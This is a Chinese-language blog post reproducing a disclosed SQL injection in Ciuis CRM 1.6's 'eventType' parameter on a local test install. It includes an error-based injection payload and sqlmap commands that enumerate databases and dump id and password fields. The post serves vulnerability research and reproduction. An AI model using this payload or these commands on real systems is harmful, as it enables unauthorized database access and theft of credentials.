---
title: Ciuis CRM 1.6 - 'eventType' SQL Inj.复现
date: 2019-08-1 14:20:00
author: dylan
top: false
cover: false
password: 
categories: web安全
tags: 
    - 漏洞复现
    - Ciuis CRM 1.6
    - SQL Inj.
---
# 0x01 漏洞详情
```
===========================================================================================
# Exploit Title: CiuisCRM 1.6 - 'eventType' SQL Inj.
# Dork: N/A
# Date: 27-05-2019
# Exploit Author: Mehmet EMİROĞLU
# Vendor Homepage: https://codecanyon.net/item/ciuis-crm/20473489
# Software Link: https://codecanyon.net/item/ciuis-crm/20473489
# Version: v1.6
# Category: Webapps
# Tested on: Wamp64, Windows
# CVE: N/A
# Software Description: Ciuis CRM you can easily manage your customer relationships and save time on your business.
===========================================================================================
# POC - SQLi
# Parameters : eventType
# Attack Pattern :
-1+or+1%3d1+and(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)
# POST Method : http://localhost/ciuiscrm-16/calendar/addevent
===========================================================================================
```

***
# 0x02 漏洞复现
下载Ciuis CRM 1.6，搭建本地环境
![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175019.png)

点击CALENDAR，然后点添加按钮
![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175107.png)

随便填入东西，使用burpsuite抓包
![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175408.png)

在`eventType=1`后面添加单引号，发包，出现报错信息，存在注入点
![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175628.png)

将请求信息保存下来（ciuis.txt）用sqlmap跑

`python sqlmap.py -r F:\Desktop\ciuis.txt`
![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801181356.png)

查数据库
`python sqlmap.py -r F:\Desktop\ciuis.txt --dbs`

查表
`python sqlmap.py -r F:\Desktop\ciuis.txt -D ciuis --tables`

查字段
`python sqlmap.py -r F:\Desktop\ciuis.txt -D ciuis -T tags --columns`

dump出指定字段
`python sqlmap.py -r F:\Desktop\ciuis.txt -D ciuis -T tags -C id,password --dump`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801181516.png)

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801181614.png)

***
# 参考文章
[CiuisCRM 1.6 SQL Injection](https://exploit.kitploit.com/2019/07/ciuiscrm-16-sql-injection.html)